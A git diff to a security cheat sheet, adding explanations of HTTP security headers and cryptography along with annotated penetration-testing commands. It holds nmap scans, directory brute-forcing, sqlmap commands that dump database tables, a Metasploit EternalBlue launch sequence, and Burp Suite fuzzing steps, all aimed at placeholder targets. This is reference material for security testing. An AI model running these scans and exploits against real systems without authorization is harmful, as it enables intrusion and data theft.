@@ -119,13 +119,45 @@ CSP defines allowed content sources to mitigate XSS and data injection attacks.
 ```http
 Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self'
 ```
-* default-src: fallback
-* script-src/style-src/img-src: allowed sources
+* **default-src**: fallback
+* **script-src/style-src/img-src**: allowed sources
+
+### Strict-Transport-Security (HSTS)
+The HSTS header ensures that web browsers will always connect over HTTPS.
+
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+* **max-age:** duration in seconds
+* **includeSubDomains**: applies to all subdomains
+* **preload**: eligible for browser preload lists
+
+### X-Content-Type-Options
+Prevents MIME type sniffing attacks by enforcing declared content types.
+
+```http
+X-Content-Type-Options: nosniff
+```
+* **nosniff**: browser must respect Content-Type header
+* Prevents execution of non-executable MIME types
+
+### Referrer-Policy
+Controls how much referrer information is sent with requests.
+
+```http
+Referrer-Policy: strict-origin-when-cross-origin 
+```
+* **strict-origin-when-cross-origin:** full URL for same-origin, origin for cross-origin
+* **strict-origin:** only origin for cross-origin requests
+* **same-origin:** only for same-origin requests
+* **no-referrer:** never send referrer
 
 
 ## Cryptography
 
 ### Symmetric Encryption
+Symmetric encryption uses the same key for both encryption and decryption.
+
 ```python
 # AES encryption
 from cryptography.fernet import Fernet
@@ -143,6 +175,8 @@ decrypted = cipher.decrypt(encrypted)
 ```
 
 ### Asymmetric Encryption
+Asymmetric encryption uses a pair of keys: a public key for encryption and a private key for decryption.
+
 ```bash
 # RSA key generation
 openssl genrsa -out private.pem 2048
@@ -156,6 +190,8 @@ openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
 ```
 
 ### Digital Signatures
+Digital signatures merge authentication, integrity, and non-repudiation, enabling verification of a message or document's authenticity.
+
 ```python
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
@@ -191,6 +227,8 @@ public_key.verify(
 ```
 
 ### Hashing
+Hashing transforms data into a fixed-size string of characters, which is typically a digest that represents the original data.
+
 ```python
 import hashlib
 
@@ -214,20 +252,21 @@ bcrypt.checkpw(password.encode(), hashed)
 ### Reconnaissance
 ```bash
 # Subdomain enumeration
-subfinder -d target.com
-amass enum -d target.com
+$ subfinder -d target.com
+$ amass enum -d target.com
 
 # Port scanning
-nmap -sS -sV -O target.com
-nmap -p- --min-rate 1000 target.com
+$ nmap -sS -sV -O target.com       # Stealth scan with version detection and OS fingerprinting
+$ nmap -sV -sC -p- target.com      # Scan all ports with default scripts and version detection
 
 # Directory bruteforcing
-dirb http://target.com /usr/share/wordlists/dirb/common.txt
-gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+$ dirb http://target.com /usr/share/wordlists/dirb/common.txt
+$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
 # DNS enumeration
-dig @8.8.8.8 target.com any
-fierce -dns target.com
+$ dig @8.8.8.8 target.com any     # Query all DNS records
+$ nslookup -type=mx target.com    # Query MX records
+$ fierce -dns target.com          # DNS reconnaissance
 ```
 
 ### Vulnerability Scanning
@@ -242,30 +281,76 @@ openvas-cli -X '<create_task><name>Scan</name><target>target_ip</target></create
 nikto -h http://target.com
 
 # SQLmap
-sqlmap -u "http://target.com/page.php?id=1" --dbs
-sqlmap -u "http://target.com/page.php?id=1" -D database --tables
-sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump
+sqlmap.py -u "http://target.com/login" --dbs  # List databases
+sqlmap.py -u "http://target.com/login" -D <database_name> --tables # List tables
+sqlmap.py -u "http://target.com/login" -D <database_name> -T <table_name> --columns # List columns
+sqlmap.py -u "http://target.com/login" -D <database_name> -T <table_name> -C <column_name> --dump # Dump data
 ```
 
 ### Exploitation Frameworks
 ```bash
 # Metasploit
-msfconsole
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS target_ip
-set LHOST attacker_ip
-exploit
-
-# Burp Suite
-# Intercept HTTP requests
-# Modify parameters
-# Test for vulnerabilities
-
-# OWASP ZAP
-zap-cli quick-scan http://target.com
-zap-cli spider http://target.com
-zap-cli active-scan http://target.com
+$ msfconsole                                      # Start Metasploit console
+$ use exploit/windows/smb/ms17_010_eternalblue    # Select exploit
+$ set RHOSTS target_ip                            # Set target IP
+$ set LHOST attacker_ip                           # Set local IP  
+$ exploit                                         # Launch exploit
 ```
+
+## Burp Suite
+Burp Suite is a popular web vulnerability scanner and proxy tool used for penetration testing of web applications.
+
+Components:
+- **Proxy**: Intercept and modify web traffic.
+- **Target**: Define scope and map the application.
+  
+Features:
+- **Intruder**: Automate fuzzing and brute-force attacks.
+- **Repeater**: Edit and resend requests for testing.
+- **Sequencer**: Analyze randomness (e.g., session tokens).
+- **Decoder**: Encode/decode and transform data.
+- **Comparer**: Compare responses or data sets.
+- **Extender**: Add plugins and integrations.
+- **Scanner**: Automated vulnerability scanning (Pro only).
+
+<Details>
+<summary>Burp Suite Commands & Usage</summary>
+
+### Intercept HTTP requests
+To intercept and modify HTTP requests using Burp Suite, follow these steps:
+1. Open Burp Suite and go to the "Proxy" tab.
+2. Ensure "Intercept is on" (button should be highlighted).
+3. Configure your browser to use Burp Suite as a proxy (default is localhost:8080).
+4. Navigate to the target web application in your browser.
+5. Burp Suite will capture the HTTP requests, allowing you to view and modify them before forwarding to the server.
+6. After making modifications, click "Forward" in Burp Suite to send the request to the server.
+### Fuzzing with Intruder
+1. Go to the "Intruder" tab and select "Positions".
+2. Load a request (right-click in Proxy > Send to Intruder).
+3. Clear existing payload positions and highlight the parts of the request you want to fuzz.
+4. Click "Add §" to mark the positions.
+5. Go to the "Payloads" tab, select the payload type (e.g., simple list, numbers, etc.), and load your payloads.
+6. Click "Start attack" to begin fuzzing. Review the results for anomalies or vulnerabilities.
+### Repeating Requests with Repeater
+1. Right-click on a request in the Proxy tab and select "Send to Repeater".
+2. Go to the "Repeater" tab, where you can see the request.
+3. Modify the request as needed (e.g., change parameters, headers).
+4. Click "Send" to resend the modified request and view the response.
+### Analyzing Session Tokens with Sequencer
+1. Right-click on a request containing a session token and select "Send to Sequencer".
+2. Go to the "Sequencer" tab and start the analysis.
+3. Review the results to assess the randomness and predictability of the token.
+### Decoding Data with Decoder
+1. Go to the "Decoder" tab.
+2. Paste the encoded data (e.g., Base64, URL-encoded).
+3. Select the appropriate decoding method from the dropdown.
+4. Click "Decode" to view the decoded data.
+### Comparing Responses with Comparer
+1. Go to the "Comparer" tab.
+2. Paste the first response in the left pane and the second response in the right pane.
+3. Click "Compare" to see the differences highlighted.
+</Details>
+
 
 ## Incident Response
 
